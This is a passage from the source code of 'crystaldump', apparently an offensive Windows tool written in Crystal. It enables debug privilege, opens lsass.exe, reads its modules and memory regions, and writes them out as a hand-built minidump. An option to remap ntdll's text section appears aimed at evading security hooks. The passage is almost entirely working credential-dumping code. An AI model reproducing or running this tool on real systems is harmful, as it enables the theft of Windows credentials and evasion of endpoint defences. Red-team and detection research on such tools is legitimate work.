                     Bytes[0x07, 0x00, 0x00, 0x00] +
                     Bytes[0x38, 0x00, 0x00, 0x00] +
                     Bytes[0x44, 0x00, 0x00, 0x00] +
                     Bytes[0x09, 0x00, 0x00, 0x00] +
                     uint32_to_little_endian_bytes(mem64list_size.to_u32) +
                     uint32_to_little_endian_bytes(mem64list_offset.to_u32)

  systeminfo_stream = Bytes[0x09, 0x00] +
                      Bytes.new(6) +
                      uint32_to_little_endian_bytes(os_info.dwMajorVersion) +
                      uint32_to_little_endian_bytes(os_info.dwMinorVersion) +
                      uint32_to_little_endian_bytes(os_info.dwBuildNumber) +
                      Bytes.new(56 - 16 - 4)
  #puts "Hex: #{systeminfo_stream.map { |b| b.to_s(16).rjust(2, '0') }.join(" ")}"  # Prints the bytes in hex format


  modulelist_stream = uint32_to_little_endian_bytes(number_modules.to_u32) 
  pointer_index = 0x7C + 4 + 108 * number_modules
  module_information_list.each do |module_info|
    modulelist_stream += uint64_to_little_endian_bytes(module_info.dll_base) +
                         uint64_to_little_endian_bytes(module_info.size)  +
                         Bytes.new(4) +
                         uint64_to_little_endian_bytes(pointer_index.to_u64)
    pointer_index += module_info.full_dll_path.gsub("\\\\","\\").bytesize * 2 + 8
    modulelist_stream += Bytes.new(108 - (8 + 8 + 4 + 8))
  end

  module_information_list.each do |module_info|
    full_path_bytes = module_info.full_dll_path.gsub("\\\\","\\").encode("UTF-16LE").to_slice
    modulelist_stream += uint32_to_little_endian_bytes((module_info.full_dll_path.gsub("\\\\","\\").bytesize * 2).to_u32) +
                         full_path_bytes +
                         Bytes.new(4)
  end

  memory64list_stream = uint64_to_little_endian_bytes(memfile_list.size.to_u64) +
                        uint64_to_little_endian_bytes(offset_memory_regions.to_u64)
  memfile_list.each do |mem_file|
    base_address_bytes = hex_string_to_little_endian_bytes(mem_file.filename)
    memory64list_stream += base_address_bytes +
                           uint64_to_little_endian_bytes(mem_file.size)
  end

  memfile_list.each do |mem_file|
    memory64list_stream += mem_file.content
  end

  dump_file = header + stream_directory + systeminfo_stream + modulelist_stream + memory64list_stream
  return dump_file
end


def write_bytes(content : Bytes, file_name : String) : Nil
  File.open(file_name, "w") do |file|
    file.write content
  end
end


def crystalDump(output_file : String)
  # Call the function to enable SeDebugPrivilege
  is_admin = enable_se_debug_privilege
  if is_admin == false
    puts "[-] Run file as administrator"
    return
  end
  lsass_handle = get_process_by_name("c:\\windows\\system32\\lsass.exe")
  puts "[+] Lsass handle: \t#{lsass_handle.address}"
  
  # Lock
  os_info = get_windows_version()
  #puts os_info.dwMajorVersion.to_s
  #puts os_info.dwMinorVersion.to_s
  #puts os_info.dwBuildNumber.to_s

  # Shock
  module_information_list  = getModuleInfo(lsass_handle)
  #print_module_info(module_information_list)

  # Barrel  
  memfile_list = getMemRegions(lsass_handle)
  #print_mem_info(memfile_list)
  
  # Close lsass handle
  Ntdll.NtClose(lsass_handle)

  dump_bytes = generate_bytes(os_info, module_information_list, memfile_list)
  write_bytes(dump_bytes, output_file)
end


def main()
  remap_ntdll = false
  output = "crystal.dmp"

  option_parser = OptionParser.new do |parser|
    parser.banner = "Usage: crystaldump.exe [options]"
    parser.on("-o OUTPUTFILE", "--output=OUTPUTFILE", "Output file name") do |o|
      output = o
    end
    parser.on("-r", "--remap", "Remap library") do
      remap_ntdll = true
    end
    parser.on("-h", "--help", "Print this help message") do
      puts parser
      exit
    end
  end

  option_parser.parse
  if remap_ntdll
    replace_ntdll_txt_section()
  end

  crystalDump(output)
end


main